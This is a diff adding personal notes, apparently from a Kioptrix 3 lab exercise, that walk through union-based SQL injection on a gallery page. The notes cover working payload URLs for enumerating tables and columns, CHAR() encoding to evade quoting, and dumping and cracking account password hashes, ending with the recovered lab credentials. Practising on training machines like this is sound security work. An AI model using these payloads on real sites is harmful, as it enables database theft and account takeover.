@@ -1,0 +1,36 @@
+Super useful link for manually testing for SQLi: http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html
+
+http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,version%28%29,database%28%29,4,5,6--
+http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,version%28%29,user%28%29,4,5,6--
+
+Version: 5.0.51a-3ubuntu5.4 (Version 5.0.51 is MySQL)
+Database: gallery
+User: root@localhost
+
+Finding the table name:
+http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,group_concat%28table_name%29,user%28%29,4,5,6%20from%20information_schema.tables%20where%20table_schema=database%28%29-- 
+
+Above will list/show the list of all table names on that dataase (gallery)
+
+Because of above, we know there is a tablename called: dev_accounts
+
+Now we need to know the column names of above table
+
+http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,group_concat%28column_name%29,user%28%29,4,5,6%20FROM%20information_schema.columns%20WHERE%20table_name=dev_accounts--
+
+We cannot use "dev_accouts" string becuase it won't work, we need to use CHAR format, so we downloaded HackBar Mozilla Add-on > SQL > MySQL CHAR > and past the table name: dev_accounts. Final result:
+http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,group_concat(column_name),user(),4,5,6%20FROM%20information_schema.columns%20WHERE%20table_name=CHAR(100,%20101,%20118,%2095,%2097,%2099,%2099,%20111,%20117,%20110,%20116,%20115)--
+We get the column names of table "dev_accounts"
+
+Now that we know the column names, we can query for their contents:
+http://kioptrix3.com/gallery/gallery.php?id=-1%20union%20select%201,group_concat(username,0x3a,password),user(),4,5,6%20FROM%20dev_accounts--
+The "0x3a" is just a HEX value of ":" (colon), to divide usernames from passwords. If we put ":" instead of 0x3a it won't work.
+
+We receive usernames and passwords, but passwords are MD5 Hashed, so we just have to crack them using online MD5 hash decryptor.
+At the end we get:
+User: dreg
+Password: Mast3r
+
+User: loneferret
+Password: starwars
+
